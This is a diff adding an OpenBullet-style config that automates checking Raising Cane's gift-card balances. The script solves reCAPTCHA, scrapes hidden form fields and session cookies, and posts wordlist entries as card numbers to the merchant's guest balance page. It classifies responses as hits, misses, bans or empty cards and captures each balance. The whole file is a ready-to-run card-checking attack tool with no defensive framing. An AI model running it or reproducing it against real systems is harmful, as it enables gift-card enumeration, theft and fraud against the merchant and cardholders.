@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "RaisinCanes GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-22T18:49:29.8494034+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://raisingcanes.myguestaccount.com/guest/nologin/account-balance" "6LdndBYUAAAAAIE_sQA2y29GSRaKJHKx2DodPT6m" -> VAR "captcha" 
+#get REQUEST GET "https://raisingcanes.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_code_true PARSE "<SOURCE>" LR "type=\"hidden\" name=\"" "\"" Recursive=FALSE -> VAR "true" "" "" 
+#PARSE_submit_code PARSE "<SOURCE>" LR "nologinCardnumberSubmitButton\" name=\"" "\"" Recursive=FALSE -> VAR "submit_code" "" "" 
+#cookie PARSE "<COOKIES(JSESSIONID)>" LR "" "" Recursive=FALSE -> VAR "JSESSIONID" "" "" 
+#cookie PARSE "<COOKIES(__cfduid)>" LR "" "" Recursive=FALSE -> VAR "__cfduid" "" "" 
+#cookie PARSE "<COOKIES( __cflb)>" LR "" "" Recursive=FALSE -> VAR " __cflb" "" "" 
+#post REQUEST POST "https://raisingcanes.myguestaccount.com/guest/nologin/account-balance" AutoRedirect=TRUE 
+  CONTENT "cardnum=<USER>&<true>=true&<submit_code>=&g-recaptcha-response=<captcha>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: JSESSIONID=<JSESSIONID>; __cfduid=<__cfduid>; __cflb=< __cflb>; pxCookie=Y; Paytronix-WebUI-CSS-ONLY-Login-Merchant-ID=m_id=55" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Ban OR 
+    KEY "Your IP" 
+  KEYCHAIN Success OR 
+    KEY "$" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid card number" 
+  KEYCHAIN Retry OR 
+    KEY "Invalid CAPTCHA. Please try again. " 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "$0.00" 
+#capture_balance PARSE "<SOURCE>" LR "<div class=\"col-md-2\">" "</div>" Recursive=FALSE -> CAP "Balance" "" "" 
